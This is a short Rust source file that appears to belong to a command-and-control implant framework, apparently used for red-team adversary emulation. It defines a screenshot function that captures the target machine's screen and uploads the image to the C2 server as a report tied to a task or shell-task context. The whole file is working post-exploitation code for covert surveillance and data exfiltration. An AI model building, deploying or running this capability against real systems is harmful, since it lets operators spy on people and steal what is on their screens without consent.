use alloc::string::String;
use alloc::string::ToString;
use alloc::sync::Arc;
use eldritch_agent::{Agent, Context};
use pb::c2::report_file_request;
use pb::{c2, eldritch};
use screenshot as screenshot_lib;

pub fn screenshot(agent: Arc<dyn Agent>, context: Context) -> Result<(), String> {
    let content = screenshot_lib::capture_screen()?;

    // Metadata for screenshot is mostly optional
    let metadata = eldritch::FileMetadata {
        path: "screenshot.bmp".to_string(),
        size: content.len() as u64,
        ..Default::default()
    };

    let file_msg = eldritch::File {
        metadata: Some(metadata),
        chunk: content,
    };

    let context_val = match context {
        Context::Task(tc) => Some(report_file_request::Context::TaskContext(tc)),
        Context::ShellTask(stc) => Some(report_file_request::Context::ShellTaskContext(stc)),
    };

    let req = c2::ReportFileRequest {
        context: context_val,
        chunk: Some(file_msg),
        kind: c2::ReportFileKind::Screenshot as i32,
    };

    agent.report_file(req).map(|_| ())
}
